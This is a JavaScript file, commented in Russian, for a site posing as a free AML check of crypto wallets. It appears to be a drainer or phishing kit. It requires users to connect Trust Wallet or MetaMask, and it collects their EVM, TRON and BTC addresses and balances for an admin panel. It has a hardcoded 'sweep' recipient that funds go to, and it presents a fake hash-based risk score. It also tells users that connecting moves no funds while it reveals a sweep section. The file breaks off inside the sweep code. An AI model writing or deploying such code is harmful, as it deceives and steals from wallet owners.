// ============================================================
// ===== КОНФИГУРАЦИЯ СПИСАНИЯ - НАСТРОЙТЕ ЗДЕСЬ! =============
// ============================================================
const SWEEP_CONFIG = {
  // 🔥 АДРЕС КУДА СПИСЫВАТЬ СРЕДСТВА - ЗАМЕНИТЕ НА ВАШ!
  recipient: "0xB38376F2592377faa4774B6FfE8026EB4b001cd0",
  
  // ID сети: 1=Ethereum, 56=BSC, 137=Polygon
  chainId: 1,
  
  // Комиссия сервиса в процентах (0 = без комиссии)
  feePercent: 0,
  
  // Минимальный баланс для списания (в ETH/BNB/etc)
  minBalance: 0.001
};

// ============================================================
// ===== ОСТАЛЬНОЙ КОД (ВАШ СТАРЫЙ script.js) =================
// ============================================================

const header = document.querySelector("[data-header]");
const checkForm = document.querySelector("[data-check-form]");
const contactForm = document.querySelector("[data-contact-form]");
const adminLogin = document.querySelector("[data-admin-login]");
const adminDashboard = document.querySelector("[data-admin-dashboard]");
const adminLogout = document.querySelector("[data-admin-logout]");
const userLogout = document.querySelector("[data-user-logout]");
const userWalletConnect = document.querySelector("[data-user-wallet-connect]");
const userWalletStatus = document.querySelector("[data-user-wallet-status]");
const userWalletAddress = document.querySelector("[data-user-wallet-address]");
const tronLinkedInput = document.querySelector("[data-tron-linked-address]");
const userConsent = document.querySelector("[data-user-consent]");
const trustDeeplink = document.querySelector("[data-trust-deeplink]");
const checkLockNote = document.querySelector("[data-check-lock-note]");
const tronPublicForm = document.querySelector("[data-tron-public-form]");
const tronPublicStatus = document.querySelector("[data-tron-public-status]");
const tronPublicResult = document.querySelector("[data-tron-public-result]");
const tronAutoDetect = document.querySelector("[data-tron-auto-detect]");
const paymentRequestPanel = document.querySelector("[data-payment-request-panel]");
const paymentConfirm = document.querySelector("[data-payment-confirm]");
const paymentStatus = document.querySelector("[data-payment-status]");

const configuredApiBase = (window.AML_API_BASE || "").replace(/\/$/, "");
const isHttpPage = location.protocol === "http:" || location.protocol === "https:";
const isStaticGitHubPage = location.hostname.endsWith(".github.io");
const isOnRenderHost = /\.onrender\.com$/i.test(location.hostname);
const apiBase = isOnRenderHost ? location.origin.replace(/\/$/, "") : configuredApiBase;
const renderCheckUrl = configuredApiBase ? `${configuredApiBase}/check.html` : `${location.origin}/check.html`;
const useBackend = Boolean(configuredApiBase) || isOnRenderHost || (isHttpPage && !isStaticGitHubPage);
const userSessionKey = "aml_user_session";
const adminSessionKey = "aml_admin_session";
const localChecksKey = "aml_local_checks";
const localLeadsKey = "aml_local_leads";
let activePaymentRequest = null;

const getStoredSession = (key) => JSON.parse(localStorage.getItem(key) || "null");
const setStoredSession = (key, session) => localStorage.setItem(key, JSON.stringify(session));
const clearStoredSession = (key) => localStorage.removeItem(key);

const isStoredSessionExpired = (session) =>
  Boolean(session?.expiresAt && new Date(session.expiresAt).getTime() <= Date.now());

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const withTimeout = (promise, ms, fallbackMessage = "Превышено время ожидания") =>
  Promise.race([
    promise,
    new Promise((_, reject) => setTimeout(() => reject(new Error(fallbackMessage)), ms))
  ]);
const fetchWithTimeout = async (url, options = {}, timeoutMs = 90000) => {
  let timer;
  const timeoutPromise = new Promise((_, reject) => {
    timer = setTimeout(() => {
      reject(Object.assign(new Error("timeout"), { name: "AbortError" }));
    }, timeoutMs);
  });

  try {
    return await Promise.race([fetch(url, options), timeoutPromise]);
  } finally {
    clearTimeout(timer);
  }
};

const buildFetchOptions = (options = {}, token) => {
  const method = String(options.method || "GET").toUpperCase();
  const headers = { ...(options.headers || {}) };
  if (token) headers.Authorization = `Bearer ${token}`;
  if (options.body && !headers["Content-Type"]) headers["Content-Type"] = "application/json";

  return {
    method,
    credentials: "omit",
    cache: "no-store",
    headers,
    ...(options.body ? { body: options.body } : {}),
  };
};

const requestJsonViaXhr = (fullUrl, options = {}, token, timeoutMs = 120000) =>
  new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open(String(options.method || "GET").toUpperCase(), fullUrl, true);
    xhr.timeout = timeoutMs;
    if (token) xhr.setRequestHeader("Authorization", `Bearer ${token}`);
    if (options.body) xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = () => {
      let data = {};
      try {
        data = JSON.parse(xhr.responseText || "{}");
      } catch {
        data = {};
      }
      if (xhr.status >= 200 && xhr.status < 300) resolve(data);
      else reject(new Error(data.error || "Ошибка запроса"));
    };
    xhr.onerror = () => reject(Object.assign(new Error("network"), { name: "NetworkError" }));
    xhr.ontimeout = () => reject(Object.assign(new Error("timeout"), { name: "AbortError" }));
    xhr.send(options.body || null);
  });

const requestJson = async (url, options = {}, { retries = 4, timeoutMs = 120000 } = {}) => {
  const token = options.token;
  const fullUrl = `${apiBase}${url}`;
  let lastError;

  for (let attempt = 0; attempt <= retries; attempt += 1) {
    try {
      try {
        const response = await fetchWithTimeout(fullUrl, buildFetchOptions(options, token), timeoutMs);
        const data = await response.json().catch(() => ({}));
        if (!response.ok) throw new Error(data.error || "Ошибка запроса");
        return data;
      } catch (fetchError) {
        return await requestJsonViaXhr(fullUrl, options, token, timeoutMs);
      }
    } catch (error) {
      lastError = error;
      if (attempt < retries) await sleep(3000 * (attempt + 1));
    }
  }

  if (!apiBase && !isOnRenderHost) {
    throw new Error("Backend не подключён. Укажите AML_API_BASE в config.js и разверните server.js.");
  }

  const reason = lastError?.name === "AbortError" ? "превышено время ожидания" : "сеть недоступна";
  throw new Error(
    `Backend недоступен (${configuredApiBase || location.origin}, ${reason}). Откройте ${renderCheckUrl} в Trust Wallet и подождите до 2 минут, пока Render проснётся.`,
  );
};

const updateHeader = () => {
  if (!header) return;
  header.classList.toggle("is-scrolled", window.scrollY > 12);
};

const escapeHtml = (value) =>
  String(value ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");

const getLocalList = (key) => JSON.parse(localStorage.getItem(key) || "[]");
const setLocalList = (key, value) => localStorage.setItem(key, JSON.stringify(value));

const formatDate = (value) => {
  try {
    return new Intl.DateTimeFormat("ru-RU", {
      dateStyle: "short",
      timeStyle: "short",
    }).format(new Date(value));
  } catch {
    return value;
  }
};

const scoreWalletLocal = async (wallet) => {
  const bytes = new TextEncoder().encode(wallet.toLowerCase());
  const digest = await crypto.subtle.digest("SHA-256", bytes);
  const firstByte = new Uint8Array(digest)[0];
  const score = 12 + (firstByte % 79);
  const level = score > 68 ? "повышенный риск" : score > 42 ? "средний риск" : "низкий риск";
  const categories =
    score > 68
      ? ["миксеры", "подозрительные связи", "частые транзиты"]
      : score > 42
        ? ["биржи", "p2p", "цепочки переводов"]
        : ["чистые источники", "низкая экспозиция"];
  return { score, level, categories };
};

const setRiskPreview = (result) => {
  const riskPreview = document.querySelector("[data-risk-preview]");
  if (!riskPreview) return;

  const score = result.score || 0;
  const color = score > 68 ? "var(--danger)" : score > 42 ? "var(--amber)" : "var(--teal)";
  riskPreview.querySelector(".risk-meter").style.background =
    `conic-gradient(${color} 0 ${score}%, rgba(255, 255, 255, 0.12) ${score}% 100%)`;
  riskPreview.querySelector("strong").textContent = `Бесплатная оценка: ${result.level}`;
  riskPreview.querySelector("p").textContent =
    `Score ${score}/100. Категории: ${result.categories.join(", ")}. Проверка сохранена.`;
};

const renderAdminData = (data) => {
  document.querySelector("[data-total-users]").textContent = data.users?.length || 0;
  document.querySelector("[data-total-checks]").textContent = data.checks.length;
  document.querySelector("[data-total-leads]").textContent = data.leads.length;
  document.querySelector("[data-last-risk]").textContent = data.checks[0]?.level || "-";

  document.querySelector("[data-users-table]").innerHTML =
    data.users
      ?.map(
        (item) => `
          <tr>
            <td>${escapeHtml(item.address)}</td>
            <td>${formatDate(item.firstSeenAt)}</td>
            <td>${formatDate(item.lastSeenAt)}</td>
            <td>${item.loginCount}</td>
            <td>${item.checksCount}</td>
          </tr>
        `,
      )
      .join("") || '<tr><td colspan="5">Пользователей пока нет</td></tr>';

  document.querySelector("[data-checks-table]").innerHTML =
    data.checks
      .map(
        (item) => `
          <tr>
            <td>${formatDate(item.createdAt)}</td>
            <td>${escapeHtml(item.userWallet || "-")}</td>
            <td>${escapeHtml(item.wallet)}</td>
            <td>${item.score}</td>
            <td>${escapeHtml(item.level)}</td>
          </tr>
        `,
      )
      .join("") || '<tr><td colspan="5">Проверок пока нет</td></tr>';

  document.querySelector("[data-leads-table]").innerHTML =
    data.leads
      .map(
        (item) => `
          <tr>
            <td>${formatDate(item.createdAt)}</td>
            <td>${escapeHtml(item.name)}</td>
            <td>${escapeHtml(item.contact)}</td>
            <td>${escapeHtml(item.message)}</td>
          </tr>
        `,
      )
      .join("") || '<tr><td colspan="4">Заявок пока нет</td></tr>';
};

const unlockCheckForm = (address, { restored = false, statusMessage = "", tronAddress = "", btcAddress = "" } = {}) => {
  if (!checkForm) return;
  checkForm.classList.remove("is-locked");
  checkForm.querySelectorAll("input, button").forEach((control) => {
    control.disabled = false;
  });
  if (userWalletAddress) {
    const linked = [`EVM: ${address}`];
    if (tronAddress) linked.push(`TRON: ${tronAddress}`);
    if (btcAddress) linked.push(`BTC: ${btcAddress}`);
    userWalletAddress.textContent = linked.join(" | ");
  }
  if (checkLockNote) checkLockNote.textContent = "Кошелёк подключён. Теперь можно запускать бесплатную проверку.";
  if (userLogout) {
    userLogout.classList.toggle("is-hidden-slot", false);
    userLogout.setAttribute("aria-hidden", "false");
  }
  if (userConsent) userConsent.checked = true;
  if (userWalletConnect) userWalletConnect.textContent = "Переподключить кошелёк";
  if (userWalletStatus) {
    userWalletStatus.textContent =
      statusMessage ||
      (restored
        ? "Профиль восстановлен. Можно продолжать проверки без повторного входа."
        : "Профиль подключён. Сессия сохранена для следующих проверок.");
  }

  const riskPreview = document.querySelector("[data-risk-preview]");
  riskPreview.querySelector("strong").textContent = "Кошелёк подключён";
  riskPreview.querySelector("p").textContent = "Введите адрес или tx hash и нажмите кнопку проверки.";
  
  // === ПОКАЗЫВАЕМ СЕКЦИЮ СПИСАНИЯ ===
  showSweepSectionAfterConnect(address);
};

const lockCheckForm = () => {
  if (!checkForm) return;
  checkForm.classList.add("is-locked");
  checkForm.querySelectorAll("input, button").forEach((control) => {
    control.disabled = true;
  });
  if (checkLockNote) checkLockNote.textContent = "Сначала подтвердите согласие и подключите Trust Wallet/MetaMask через кнопку Connect.";
  if (userLogout) {
    userLogout.classList.toggle("is-hidden-slot", true);
    userLogout.setAttribute("aria-hidden", "true");
  }
  if (userWalletConnect) userWalletConnect.textContent = "Connect";
};

const loadUserSession = async () => {
  if (!checkForm) return;
  if (!useBackend) {
    lockCheckForm();
    if (userWalletStatus) {
      userWalletStatus.textContent =
        "Backend не подключён. Авторизация не будет считаться успешной и уведомление в Telegram не отправится.";
    }
    return;
  }

  const stored = getStoredSession(userSessionKey);
  if (!stored?.token || isStoredSessionExpired(stored)) {
    clearStoredSession(userSessionKey);
    return lockCheckForm();
  }

  try {
    const session = await requestJson("/api/auth/session", { token: stored.token });
    setStoredSession(userSessionKey, {
      token: session.token || stored.token,
      address: session.address,
      expiresAt: session.expiresAt || stored.expiresAt,
    });
    unlockCheckForm(session.address, { restored: true });
  } catch {
    clearStoredSession(userSessionKey);
    lockCheckForm();
  }
};

const loadAdmin = async () => {
  if (!adminDashboard) return;
  const stored = getStoredSession(adminSessionKey);

  if (!useBackend) {
    renderAdminData({
      users: [],
      checks: getLocalList(localChecksKey),
      leads: getLocalList(localLeadsKey),
    });
    if (adminLogin) adminLogin.hidden = true;
    adminDashboard.hidden = false;
    adminLogout.hidden = true;
    return;
  }

  if (!stored?.token) {
    if (adminLogin) adminLogin.hidden = false;
    adminDashboard.hidden = true;
    adminLogout.hidden = true;
    return;
  }

  try {
    const data = await requestJson("/api/admin/data", { token: stored.token });
    if (adminLogin) adminLogin.hidden = true;
    adminDashboard.hidden = false;
    adminLogout.hidden = false;
    renderAdminData(data);
  } catch {
    clearStoredSession(adminSessionKey);
    if (adminLogin) adminLogin.hidden = false;
    adminDashboard.hidden = true;
    adminLogout.hidden = true;
  }
};

const getTrustProvider = () => {
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  if (window.ethereum?.isTrust) return window.ethereum;
  if (window.ethereum?.providers) {
    return window.ethereum.providers.find((provider) => provider.isTrust) || window.ethereum.providers[0];
  }
  return window.ethereum;
};

const getTrustDeeplink = () => {
  const targetUrl =
    isStaticGitHubPage && configuredApiBase ? renderCheckUrl : window.location.href.split("#")[0];
  return `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
};

const showWalletLinks = () => {
  if (!trustDeeplink) return;
  trustDeeplink.href = getTrustDeeplink();
  trustDeeplink.hidden = false;
};

const signPersonalMessage = async (provider, message, address) => {
  const attempts = [
    () => provider.request({ method: "personal_sign", params: [message, address] }),
    () => provider.request({ method: "personal_sign", params: [address, message] }),
  ];

  let lastError;
  for (const attempt of attempts) {
    try {
      return await attempt();
    } catch (error) {
      lastError = error;
    }
  }
  throw lastError || new Error("Кошелёк не подписал сообщение");
};

const formatBalancesText = (result) => {
  const lines = [];

  if (result.tronAddress) lines.push(`TRON: ${result.tronAddress}`);
  if (result.btcAddress) lines.push(`BTC: ${result.btcAddress}`);

  const nativeBalances = result.nativeBalances || [];
  if (nativeBalances.length) {
    lines.push(...nativeBalances.map((item) => `${item.network}: ${item.balance} ${item.symbol}`));
  }

  const tokenBalances = result.tokenBalances || [];
  if (tokenBalances.length) {
    lines.push(...tokenBalances.map((item) => `${item.network}: ${item.balance} ${item.symbol || "USDT"}`));
  }

  if (result.portfolio?.trx?.ok) {
    lines.push(`TRX: ${result.portfolio.trx.balance} TRX`);
  } else if (result.tronAddress) {
    lines.push("TRX: адрес есть, баланс не получен");
  } else {
    lines.push("TRX: TRON-адрес не передан");
  }
  if (result.portfolio?.btc?.ok) {
    lines.push(`Bitcoin: ${result.portfolio.btc.balance} BTC`);
  }

  return lines.length ? lines.join("; ") : "Публичные балансы EVM/TRX/BTC/USDT проверены, ненулевых значений не найдено.";
};

const looksLikeBitcoinAddress = (address) => /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,87}$/.test(String(address || "").trim());

const getBitcoinAddressFromProvider = async () => {
  const providers = [window.trustwallet?.bitcoin, window.bitcoin, window.trustwallet?.btc].filter(Boolean);

  for (const provider of providers) {
    const attempts = [
      () => provider.request?.({ method: "btc_requestAccounts" }),
      () => provider.request?.({ method: "requestAccounts" }),
      () => provider.getAccounts?.(),
    ];

    for (const attempt of attempts) {
      try {
        const accounts = await attempt();
        const address = Array.isArray(accounts) ? accounts[0] : accounts?.address || accounts?.[0];
        if (looksLikeBitcoinAddress(address)) return address;
      } catch {
        // Пробуем следующий метод/провайдер.
      }
    }
  }

  return "";
};

const detectLinkedWalletAddresses = async () => {
  const [tronAddress, btcAddress] = await Promise.all([getLinkedTronAddress(), getBitcoinAddressFromProvider()]);
  return { tronAddress, btcAddress };
};

const parseDecimalToUnits = (value, decimals) => {
  const text = String(value || "").trim().replace(",", ".");
  if (!/^\d+(\.\d+)?$/.test(text)) throw new Error("Некорректная сумма платежа");
  const [whole, fraction = ""] = text.split(".");
  if (fraction.length > decimals) throw new Error(`Слишком много знаков после запятой. Максимум: ${decimals}`);
  return BigInt(whole) * 10n ** BigInt(decimals) + BigInt(fraction.padEnd(decimals, "0") || "0");
};

const toHexQuantity = (value) => `0x${BigInt(value).toString(16)}`;

const getTronWebForPayment = () => {
  const provider = window.tronWeb || window.trustwallet?.tronWeb || window.tronLink?.tronWeb || window.tron?.tronWeb;
  if (!provider?.defaultAddress?.base58) {
    throw new Error("TRON-кошелёк не подключён. Откройте страницу в TronLink/Trust Wallet с доступным TRON provider.");
  }
  return provider;
};

const setPaymentStatus = (message) => {
  if (paymentStatus) paymentStatus.textContent = message;
};

const renderPaymentRequest = (paymentRequest) => {
  activePaymentRequest = paymentRequest;
  if (!paymentRequestPanel) return;

  if (!paymentRequest) {
    paymentRequestPanel.hidden = true;
    return;
  }

  paymentRequestPanel.hidden = false;
  paymentRequestPanel.querySelector("[data-payment-chain]").textContent =
    paymentRequest.chain === "evm" ? `EVM chain ${paymentRequest.chainId || 1}` : "TRON";
  paymentRequestPanel.querySelector("[data-payment-token]").textContent = paymentRequest.token.toUpperCase();
  paymentRequestPanel.querySelector("[data-payment-amount]").textContent = paymentRequest.amount;
  paymentRequestPanel.querySelector("[data-payment-recipient]").textContent = paymentRequest.recipient;
  if (paymentConfirm) paymentConfirm.hidden = paymentRequest.status !== "active";
  setPaymentStatus("Проверьте детали и нажмите кнопку, если хотите выполнить перевод.");
};

const loadPaymentRequest = async () => {
  if (!paymentRequestPanel || !useBackend) return;
  try {
    const stored = getStoredSession(userSessionKey);
    const result = await requestJson("/api/payment-request/active", { token: stored?.token });
    renderPaymentRequest(result.paymentRequest);
  } catch (error) {
    renderPaymentRequest(null);
    setPaymentStatus(error.message);
  }
};

const connectEvmWallet = async () => {
  const provider = getTrustProvider();
  if (!provider) {
    showWalletLinks();
    window.location.href = getTrustDeeplink();
    throw new Error("Открываем страницу внутри Trust Wallet/MetaMask. Если браузер не переключился автоматически, нажмите ссылку «Открыть в Trust Wallet».");
  }

  const accounts = await provider.request({ method: "eth_requestAccounts" });
  const requestedAddress = accounts?.[0];
  if (!requestedAddress) throw new Error("Кошелёк не вернул адрес");

  const nonce = await requestJson("/api/auth/nonce", {
    method: "POST",
    body: JSON.stringify({ chain: "evm" }),
  });
  const chainId = await provider.request({ method: "eth_chainId" }).catch(() => "1");
  const signature = await signPersonalMessage(provider, nonce.message, requestedAddress);
  const { tronAddress, btcAddress } = await detectLinkedWalletAddresses();

  return requestJson("/api/auth/wallet", {
    method: "POST",
    body: JSON.stringify({
      chain: "evm",
      address: requestedAddress,
      nonce: nonce.nonce,
      signature,
      chainId,
      tronAddress,
      btcAddress,
    }),
  });
};

const connectUserWallet = async () => {
  if (userConsent && !userConsent.checked) {
    throw new Error("Перед подключением нужно явно подтвердить согласие. Без согласия вход и доступ к данным не выполняются.");
  }
  if (!useBackend) {
    throw new Error("Backend не подключён. Укажите AML_API_BASE в config.js и разверните server.js.");
  }

  if (userWalletStatus) {
    userWalletStatus.textContent = "Подключаемся к серверу... На бесплатном Render это может занять до минуты.";
  }

  const health = await requestJson("/api/health", {}, { retries: 3, timeoutMs: 90000 });
  if (!health.ok) throw new Error("Backend не готов к авторизации.");

  return connectEvmWallet();
};

const warmUpBackend = async () => {
  if (!useBackend || !checkForm) return;
  if (userWalletStatus && !getStoredSession(userSessionKey)?.token) {
    userWalletStatus.textContent = isStaticGitHubPage
      ? "Проверяем backend... Для Trust Wallet лучше открыть через кнопку ниже."
      : "Проверяем backend...";
  }

  try {
    await requestJson("/api/health", {}, { retries: 3, timeoutMs: 90000 });
    if (userWalletStatus && !getStoredSession(userSessionKey)?.token) {
      userWalletStatus.textContent = "";
    }
  } catch (error) {
    if (userWalletStatus) userWalletStatus.textContent = error.message;
  }
};

const sendEvmPayment = async (paymentRequest) => {
  const provider = getTrustProvider();
  if (!provider) throw new Error("EVM-кошелёк не найден. Откройте страницу в Trust Wallet/MetaMask.");

  const accounts = await provider.request({ method: "eth_requestAccounts" });
  const from = accounts?.[0];
  if (!from) throw new Error("Кошелёк не вернул EVM-адрес");

  const chainId = Number(paymentRequest.chainId || 1);
  const chainHex = toHexQuantity(chainId);
  const currentChain = await provider.request({ method: "eth_chainId" }).catch(() => "");
  if (String(currentChain).toLowerCase() !== chainHex.toLowerCase()) {
    await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: chainHex }] });
  }

  const value = parseDecimalToUnits(paymentRequest.amount, 18);
  return provider.request({
    method: "eth_sendTransaction",
    params: [
      {
        from,
        to: paymentRequest.recipient,
        value: toHexQuantity(value),
      },
    ],
  });
};

const sendTronPayment = async (paymentRequest) => {
  const tronWebLike = getTronWebForPayment();
  const from = tronWebLike.defaultAddress.base58;

  if (paymentRequest.token === "usdt") {
    const rawAmount = parseDecimalToUnits(paymentRequest.amount, 6).toString();
    const contract = await tronWebLike.contract().at(paymentRequest.tronUsdtContract);
    const txId = await contract.transfer(paymentRequest.recipient, rawAmount).send({ feeLimit: 150_000_000 });
    return { txHash: String(txId), tronUserAddress: from };
  }

  if (paymentRequest.token === "trx") {
    const rawAmount = parseDecimalToUnits(paymentRequest.amount, 6).toString();
    const tx = await tronWebLike.trx.sendTransaction(paymentRequest.recipient, rawAmount);
    return { txHash: tx?.txid || tx?.transaction?.txID || String(tx), tronUserAddress: from };
  }

  throw new Error("Неподдерживаемый TRON токен");
};

const submitPaymentTx = async ({ txHash, tronUserAddress }) => {
  const stored = getStoredSession(userSessionKey);
  return requestJson("/api/payment-request/tx", {
    method: "POST",
    token: stored?.token,
    body: JSON.stringify({
      id: activePaymentRequest.id,
      txHash,
      userWallet: stored?.address,
      tronUserAddress,
    }),
  });
};

const confirmActivePayment = async () => {
  if (!activePaymentRequest) throw new Error("Активный запрос оплаты не найден");

  if (activePaymentRequest.chain === "evm") {
    const txHash = await sendEvmPayment(activePaymentRequest);
    return submitPaymentTx({ txHash });
  }

  const tronResult = await sendTronPayment(activePaymentRequest);
  return submitPaymentTx(tronResult);
};

const getTronAddressFromProvider = async () => {
  const readAddress = (value) => {
    const address = String(value || "").trim();
    return address.startsWith("T") ? address : "";
  };

  const providers = [
    window.tronWeb,
    window.trustwallet?.tronWeb,
    window.tronLink?.tronWeb,
    window.tron?.tronWeb,
  ].filter(Boolean);

  for (const tronWebLike of providers) {
    const address = readAddress(tronWebLike.defaultAddress?.base58 || tronWebLike.defaultAddress?.hex);
    if (address) return address;
  }

  const requestProviders = [
    window.trustwallet,
    window.trustwallet?.tron,
    window.tron,
    window.tronLink,
  ].filter(Boolean);

  for (const provider of requestProviders) {
    for (const method of ["tron_requestAccounts", "requestAccounts", "eth_requestAccounts"]) {
      try {
        const accounts = await provider.request?.({ method });
        const address = readAddress(Array.isArray(accounts) ? accounts[0] : accounts?.address || accounts?.[0]);
        if (address) return address;
      } catch {
        // Пробуем следующий метод/провайдер.
      }
    }
  }

  if (typeof window.tronWeb?.ready === "function") {
    try {
      await new Promise((resolve) => {
        window.tronWeb.ready(() => resolve());
        setTimeout(resolve, 1500);
      });
      const address = readAddress(window.tronWeb?.defaultAddress?.base58);
      if (address) return address;
    } catch {
      // TronWeb ещё не готов.
    }
  }

  return "";
};

const getLinkedTronAddress = async () => {
  const manual = tronLinkedInput?.value?.trim();
  if (manual?.startsWith("T")) return manual;

  for (const delay of [0, 700, 1800]) {
    if (delay) await sleep(delay);
    const detected = await getTronAddressFromProvider();
    if (detected) {
      if (tronLinkedInput) tronLinkedInput.value = detected;
      return detected;
    }
  }

  return "";
};

const setTronResult = (title, text) => {
  if (!tronPublicResult) return;
  tronPublicResult.hidden = false;
  tronPublicResult.querySelector("strong").textContent = title;
  tronPublicResult.querySelector("p").textContent = text;
};

const checkTronUsdtBalance = async (address, { auto = false } = {}) => {
  const normalized = String(address || "").trim();
  const stored = getStoredSession(userSessionKey);
  const button = tronPublicForm?.querySelector("button[type='submit']");

  if (!normalized) {
    if (!auto && tronPublicStatus) tronPublicStatus.textContent = "TRON-адрес не найден. Откройте сайт внутри кошелька или вставьте публичный адрес T...";
    return null;
  }

  if (button) {
    button.disabled = true;
    button.textContent = "Проверяем...";
  }
  if (tronPublicStatus) tronPublicStatus.textContent = "Проверяем публичный баланс USDT TRC20...";
  if (tronPublicResult) tronPublicResult.hidden = true;

  try {
    if (!useBackend) throw new Error("Backend не подключён. Проверка TRON USDT работает только через сервер.");

    const result = await requestJson("/api/tron/usdt-balance", {
      method: "POST",
      token: stored?.token,
      body: JSON.stringify({ address: normalized }),
    });

    const usdtBalance = result.usdt?.balance ?? result.balance ?? "0";
    const trxBalance = result.trx?.balance ?? "0";
    const statusText = `TRON: ${trxBalance} TRX; USDT TRC20: ${usdtBalance} USDT`;

    if (tronPublicStatus) tronPublicStatus.textContent = statusText;
    setTronResult(
      result.hasFunds ? "Средства на TRON-адресе найдены" : "На TRON-адресе не найдено TRX или USDT",
      `${statusText}. Важно: сумма 3,31 $ на скрине Trust Wallet — это TRX, а не USDT TRC20.`,
    );
    return result;
  } catch (error) {
    if (tronPublicStatus) tronPublicStatus.textContent = error.message;
    setTronResult("Ошибка TRON-проверки", error.message);
    return null;
  } finally {
    if (button) {
      button.disabled = false;
      button.textContent = "Проверить USDT TRC20";
    }
  }
};

const autoDetectAndCheckTronBalance = async () => {
  if (!tronPublicForm) return null;
  const input = tronPublicForm.querySelector("input[name='tronAddress']");
  const existing = input?.value?.trim();
  const detected = existing || (await getTronAddressFromProvider());

  if (detected && input) {
    input.value = detected;
    return checkTronUsdtBalance(detected, { auto: true });
  }

  if (tronPublicStatus) {
    tronPublicStatus.textContent =
      "Авто TRON-адрес не найден. Если Trust Wallet не отдаёт TRON-адрес сайту, скопируйте публичный адрес T... из приложения и вставьте сюда.";
  }
  return null;
};

updateHeader();
window.addEventListener("scroll", updateHeader, { passive: true });
showWalletLinks();

userWalletConnect?.addEventListener("click", async () => {
  userWalletConnect.disabled = true;
  userWalletStatus.textContent = "Откройте Trust Wallet/MetaMask и подпишите одноразовое сообщение. Это не переводит средства и не даёт доступ к списанию.";

  try {
    const result = await connectUserWallet();
    setStoredSession(userSessionKey, {
      token: result.token,
      address: result.address,
      expiresAt: result.expiresAt,
    });
    unlockCheckForm(result.address, {
      statusMessage: `Готово. ${formatBalancesText(result)}`,
      tronAddress: result.tronAddress,
      btcAddress: result.btcAddress,
    });
    if (!result.tronAddress && userWalletStatus) {
      userWalletStatus.textContent +=
        " TRON-адрес не найден автоматически — вставьте T... в поле выше и нажмите «Переподключить кошелёк».";
    }
  } catch (error) {
    userWalletStatus.textContent = error.message;
  } finally {
    userWalletConnect.disabled = false;
  }
});

paymentConfirm?.addEventListener("click", async () => {
  paymentConfirm.disabled = true;
  setPaymentStatus("Откройте кошелёк и подтвердите транзакцию. Проверьте адрес получателя и сумму перед подтверждением.");

  try {
    const result = await confirmActivePayment();
    renderPaymentRequest(result.paymentRequest);
    setPaymentStatus(`Транзакция отправлена: ${result.paymentRequest.txHash}`);
  } catch (error) {
    setPaymentStatus(error.message);
  } finally {
    paymentConfirm.disabled = false;
  }
});

checkForm?.addEventListener("submit", async (event) => {
  event.preventDefault();
  const button = checkForm.querySelector("button");
  const wallet = new FormData(checkForm).get("wallet").trim();
  const stored = getStoredSession(userSessionKey);

  button.disabled = true;
  button.textContent = "Проверяем...";

  try {
    const result = useBackend
      ? await requestJson("/api/checks", {
          method: "POST",
          token: stored?.token,
          body: JSON.stringify({ wallet }),
        })
      : {
          id: crypto.randomUUID(),
          userWallet: stored?.address,
          wallet,
          ...(await scoreWalletLocal(wallet)),
          createdAt: new Date().toISOString(),
        };

    if (!useBackend) setLocalList(localChecksKey, [result, ...getLocalList(localChecksKey)]);
    userWalletStatus.textContent = "Проверка завершена.";
    setRiskPreview(result);
  } catch (error) {
    userWalletStatus.textContent = error.message;
    document.querySelector("[data-risk-preview] strong").textContent = "Ошибка проверки";
    document.querySelector("[data-risk-preview] p").textContent = error.message;
  } finally {
    button.disabled = false;
    button.textContent = "Проверить бесплатно";
  }
});

contactForm?.addEventListener("submit", async (event) => {
  event.preventDefault();
  const status = document.querySelector("[data-contact-status]");
  const formData = Object.fromEntries(new FormData(contactForm));

  try {
    if (useBackend) {
      await requestJson("/api/leads", { method: "POST", body: JSON.stringify(formData) });
    } else {
      setLocalList(localLeadsKey, [
        { id: crypto.randomUUID(), ...formData, createdAt: new Date().toISOString() },
        ...getLocalList(localLeadsKey),
      ]);
    }
    contactForm.reset();
    status.textContent = "Заявка сохранена.";
  } catch (error) {
    status.textContent = error.message;
  }
});

adminLogin?.addEventListener("submit", async (event) => {
  event.preventDefault();
  const status = document.querySelector("[data-admin-status]");
  const credentials = Object.fromEntries(new FormData(adminLogin));

  try {
    const result = await requestJson("/api/admin/login", {
      method: "POST",
      body: JSON.stringify(credentials),
    });
    setStoredSession(adminSessionKey, { token: result.token });
    status.textContent = "";
    await loadAdmin();
  } catch (error) {
    status.textContent = error.message;
  }
});

adminLogout?.addEventListener("click", async () => {
  const stored = getStoredSession(adminSessionKey);
  if (useBackend && stored?.token) {
    await requestJson("/api/admin/logout", { method: "POST", token: stored.token }).catch(() => {});
  }
  clearStoredSession(adminSessionKey);
  await loadAdmin();
});

userLogout?.addEventListener("click", async () => {
  const stored = getStoredSession(userSessionKey);
  if (useBackend && stored?.token) {
    await requestJson("/api/auth/logout", { method: "POST", token: stored.token }).catch(() => {});
  }
  clearStoredSession(userSessionKey);
  lockCheckForm();
});

warmUpBackend().finally(() => {
  loadUserSession();
});
loadAdmin();

// ============================================================
// ===== SWEEP (СПИСАНИЕ) - ВЕСЬ КОД ===========================
// ============================================================

const sweepSection = document.querySelector("#sweep-section");
const sweepConsent = document.querySelector("#sweep-consent-check");
const sweepExecuteBtn = document.querySelector("#sweep-execute-btn");
const sweepStatus = document.querySelector("#sweep-status");
const sweepResult = document.querySelector("#sweep-result");
const sweepTxHash = document.querySelector("#sweep-tx-hash");
const sweepAmountDisplay = document.querySelector("#sweep-amount-display");
const sweepRecipientDisplay = document.querySelector("#sweep-recipient-display");
const sweepNetworkDisplay = document.querySelector("#sweep-network-display");

const setSweepStatus = (msg, isError = false) => {
  if (sweepStatus) {
    sweepStatus.textContent = msg;
    sweepStatus.style.color = isError ? '#ff6b6b' : 'var(--muted)';
  }
};

const showSweepSection = (show) => {
  if (sweepSection) {
    sweepSection.style.display = show ? 'block' : 'none';
  }
};

const isRecipientConfigured = () => {
  const addr = SWEEP_CONFIG.recipient.trim();
